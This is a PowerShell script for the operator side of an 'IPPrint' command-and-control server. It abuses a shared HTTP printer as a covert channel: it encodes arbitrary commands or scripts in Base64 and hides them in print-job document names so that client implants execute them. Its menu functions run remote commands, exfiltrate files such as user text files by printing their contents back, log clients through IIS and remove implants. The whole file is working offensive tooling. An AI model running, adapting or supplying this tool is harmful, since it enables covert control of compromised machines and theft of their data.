Write-Host -ForegroundColor Yellow "IPPrint C2 Server"
Add-Type -AssemblyName System.Drawing
$IPPrintC2 = New-Object System.Drawing.Printing.PrintDocument

#Remove the printing pop-up dialog.
$IPPrintC2.PrintController = New-Object System.Drawing.Printing.StandardPrintController

# Get IIS log file directory.
$IISlogfiles = Get-Website "Default web site" | ForEach-Object {Join-Path ($_.logFile.Directory -replace '%SystemDrive%', $env:SystemDrive) "W3SVC$($_.id)"}

# Get external IP address of the C2 server to exclude it from log parsing.
$C2ExternalIP = (Invoke-WebRequest -Uri "https://ifconfig.me/ip").Content

# Configure ClientPrinterName, ItextsharpDLL and C2Output paths based on your installation. ClientPrinterName is the name of installed printer on your clients.
$ClientPrinterName = "XPS"
$C2Output = "C:\temp\c2.pdf"
$ItextsharpDLL = "$pwd\itextsharp.dll"

function Set-DefaultPrinter
{
    # Sets the default printer to the shared HTTP printer.
    Write-Host -ForegroundColor Green "Sets the default printer to the HTTP shared printer. If multiple instances of HTTP shared printers exist, do this manually."
    $DefaultPrinter = Get-WmiObject -class win32_printer -Namespace "root\cimv2" -Filter "Name LIKE '%\\%'"
    $DefaultPrinter.SetDefaultPrinter()
    $DefaultPrinterQuery = Get-WmiObject -class win32_printer -Namespace "root\cimv2" | Where-Object { $_.Default -eq 'True' } | Select-Object -expandproperty Name
    Write-Host -ForegroundColor Green "Default printer set to" $DefaultPrinterQuery
}

function Invoke-ClearClientDocuments
{
    # Clears client printed documents from queue to remove previous commands.
    $DefaultPrinterQuery = Get-WmiObject -class win32_printer -Namespace "root\cimv2" | Where-Object { $_.Default -eq 'True' } | Select-Object -expandproperty Name
    (Get-PrintJob $DefaultPrinterQuery | Where-Object {$_.documentname -eq "document"}).id | ForEach-Object {Remove-PrintJob -printername $DefaultPrinterQuery -ID $_ -ErrorAction SilentlyContinue}
}

function Invoke-ReadIISLog
{
    # Read the IIS log.
    Get-ChildItem $IISlogfiles | Sort-Object -Property lastwritetime -Descending | Select-Object -First 1 | Get-Content | ForEach-Object {$_.split(" ")[0,1,3,4,8] -join ' '} | Select-String -NotMatch -Pattern "($C2ExternalIP)|(#)"
}

function Invoke-ConvertPDFtoText {
	param(
		[Parameter(Mandatory=$true)][string]$file
	)
	Add-Type -Path $ItextsharpDLL
	$pdf = New-Object iTextSharp.text.pdf.pdfreader -ArgumentList $file
	for ($page = 1; $page -le $pdf.NumberOfPages; $page++){
		$text=[iTextSharp.text.pdf.parser.PdfTextExtractor]::GetTextFromPage($pdf,$page)
		Write-Output $text
	}
	$pdf.Close()
}

function Get-ConvertPDFtoText {
	param(
		[Parameter(Mandatory=$true)][string]$file
	)
	Add-Type -Path $ItextsharpDLL
	$pdf = New-Object iTextSharp.text.pdf.pdfreader -ArgumentList $file
	$ctext=""
	for ($page = 1; $page -le $pdf.NumberOfPages; $page++){
		$text=[iTextSharp.text.pdf.parser.PdfTextExtractor]::GetTextFromPage($pdf,$page)
		$ctext=$ctext+$text
	}
	$pdf.Close()
	return $ctext
}

function Invoke-ReadC2Output {
	if ((Get-Item $C2Output).Length -ne "0") {
		Invoke-ConvertPDFtoText $C2Output
		Invoke-ServerCleanup
	} else {
		Write-Host -ForegroundColor Red "File is empty" $C2Output
	}
}

function Invoke-FileC2Output {
	param(
		[Parameter(Mandatory=$true)][string]$outfile
	)
	if ((Get-Item $C2Output).Length -ne "0") {
		$ctext = Get-ConvertPDFtoText $C2Output
		[IO.File]::WriteAllBytes($outfile, ([convert]::FromBase64String(($ctext))))
		Invoke-ServerCleanup
	} else {
		Write-Host -ForegroundColor Red "File is empty" $C2Output
	}
}

function Invoke-ServerCleanup
{
    # Save previous output from Print-to-File.
    if ((Get-Item $C2Output).Length -ne "0") {$date = (Get-Date -format "hh-mm-ss-ms_dd-mm-yyyy"); Rename-Item $C2Output $C2Output@$date.pdf; New-Item $C2Output | Out-Null}

    # Queries the default printer and clears the print queue.
    $DefaultPrinterQuery = Get-WmiObject -class win32_printer -Namespace "root\cimv2" | Where-Object { $_.Default -eq 'True' } | Select-Object -expandproperty Name
    Get-PrintJob -PrinterName $DefaultPrinterQuery | ForEach-Object {Remove-PrintJob -PrinterName $DefaultPrinterQuery -ID $_.ID}
}

function Invoke-CommandsDocumentNameNoOutput
{
    # Clean the server not to mess up command execution.
    Invoke-ServerCleanup
    # Convert PowerShell Command to Base64.
    $CommandDoc = Read-Host "Enter commands you wish to execute without print output"
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes("[scriptblock]`$x={$CommandDoc};`$x.Invoke()")
    $EncodedCommandDocumentName = [Convert]::ToBase64String($Bytes)
    $CommandDoc = ($EncodedCommandDocumentName -split '(.{252})' | Where-Object {$_})
    ForEach ($SplittedCommand in $CommandDoc)
    {
        $IPPrintC2.DocumentName = $SplittedCommand
        $IPPrintC2.Print()
    }
}

function Invoke-CommandsDocumentNameWithOutput
{
    # Clean the server not to mess up command execution.
    Invoke-ServerCleanup
    # Convert PowerShell Command to Base64.
    $CommandDoc = Read-Host "Enter commands you wish to execute with print output"
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes("[scriptblock]`$x={$CommandDoc};`$j=(`$x|iex);Add-Type -AssemblyName System.Drawing;`$pd=New-Object System.Drawing.Printing.PrintDocument;`$pd.PrinterSettings.PrinterName=`"$ClientPrinterName`";`$pd.PrintController=new-object System.Drawing.Printing.StandardPrintController;`$f=[System.Drawing.Font]::new('Arial',10,[System.Drawing.FontStyle]::Bold);`$c=[System.Drawing.SolidBrush]::new([System.Drawing.Color]::FromArgb(255,0,0,0));`$lpp=50;`$fs=15;`$ml=`$j.Length;`$cnt=0;function GetNewLine(){`$cl=`$cnt;`$np=`$false;`$r=`$null;if(`$j -isnot [array]){if(`$cl -eq 0){`$r=`$j}}else{if(`$cnt -lt `$ml){`$r=`$j[`$cnt];if((`$cnt+1)%`$lpp -eq 0){`$np=`$true}}}`$global:cnt=`$global:cnt+1;return `$r,`$cl,`$np}`$p={`$y=10;`$_.HasMorePages=`$true;while(`$true){`$r,`$cl,`$np=GetNewLine;if(`$r -eq `$null){`$_.HasMorePages=`$false;break};`$_.Graphics.DrawString(`$r,`$f,`$c,10,`$y);`$y=`$y+`$fs;if(`$np){break;}}};`$pd.add_PrintPage(`$p);`$pd.Print()")
    $EncodedCommandDocumentName = [Convert]::ToBase64String($Bytes)
    $CommandDoc = ($EncodedCommandDocumentName -split '(.{252})' | Where-Object {$_})
    ForEach ($SplittedCommand in $CommandDoc)
    {
        $IPPrintC2.DocumentName = $SplittedCommand
        $IPPrintC2.Print()
    }
}

function Invoke-CommandsPowerShellScript
{
    # Clean the server not to mess up command execution
    Invoke-ServerCleanup
    # Encode a PowerShell script to Base64. Keep them simple.
    $PowerShellScript = Read-Host "Enter the path of the PowerShell script you wish to execute"
    $PSScript = Get-Content -Raw $PowerShellScript
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($PSScript)
    $EncodedPowerShellScript = [Convert]::ToBase64String($Bytes)
    $CommandDoc = ($EncodedPowerShellScript -split '(.{252})' | Where-Object {$_})
    ForEach ($SplittedCommand in $CommandDoc)
    {
        $IPPrintC2.DocumentName = $SplittedCommand
        $IPPrintC2.Print()
    }
}

function Invoke-DatatExfiltration
{
    # Clean the server not to mess up command execution.
    Invoke-ServerCleanup

    # To-be improved. Works currently with ASCII text. Out-Printer is noisy!
    $ExfilDocname = Read-Host "Enter the name of the document to exfiltrate (eg. c:\Windows\system32\drivers\etc\hosts) or something like `$ENV:USERPROFILE\*.txt"
    $contentExfil =  "ls -r $ExfilDocname|% {`$_.FullName;gc `$_}|lp $ClientPrinterName"
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($contentExfil)
    $EncodedCommandExfil = [Convert]::ToBase64String($Bytes)
    # Add command to DocumentName and send to printer.
    $IPPrintC2.DocumentName = $EncodedCommandExfil
    $IPPrintC2.Print()
}

function Invoke-KillClients
{
    $answer = Read-Host "Are you sure you want to kill all clients (y/n)?"
    switch ($answer)
    {
        'y' {
            Invoke-ServerCleanup
            sleep 1
            $KillClients = "Remove-Printer $ClientPrinterName"
            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($KillClients)
            $EncodedKill = [Convert]::ToBase64String($Bytes)
            $EncodedKillSplitted = ($EncodedKill -split '(.{252})' | Where-Object {$_})
            foreach ($SplittedCommand in $EncodedKillSplitted)
            {
                $IPPrintC2.DocumentName = $SplittedCommand
                $IPPrintC2.Print()
            }
        }
        'n' {
            Write-Host "Canceled."
            return
        }
    }
}

#############################################################

do {
    Write-Host -ForegroundColor Green "1. Select default C2 printer."
    Write-Host -ForegroundColor Green "2. Enter commands to execute on the client through document name without print output."
    Write-Host -ForegroundColor Green "3. Enter commands to execute on the client through document name with print output."
    Write-Host -ForegroundColor Green "4. Enter the path of the PowerShell script you would like to execute."
    Write-Host -ForegroundColor Green "5. Exfiltrate remote documents."
    Write-Host -ForegroundColor Green "6. Read output and clear queue."
    Write-Host -ForegroundColor Green "7. Clear the print queue."
    Write-Host -ForegroundColor Green "8  Read IIS logs."
    Write-Host -ForegroundColor Green "9. Kill all clients."
    Write-Host -ForegroundColor Green "0. Quit."

    $selection = Read-Host "What would you like to do?"

    switch ($selection)
    {
        '1' {
            Set-DefaultPrinter
        }
        '2' {
            Invoke-CommandsDocumentNameNoOutput
        }
        '3' {
            Invoke-CommandsDocumentNameWithOutput
        }
        '4' {
            Invoke-CommandsPowerShellScript
        }
        '5' {
            Invoke-DatatExfiltration
        }
        '6' {
            Invoke-ReadC2Output
        }
        '7' {
            Invoke-ServerCleanup
        }
        '8' {
            Invoke-ReadIISLog
        }
        '9' {
            Invoke-KillClients
        }
        '0' {
            Write-Host "Bye."
        }
    }
    Invoke-ClearClientDocuments
}
while ($selection -ne '0')
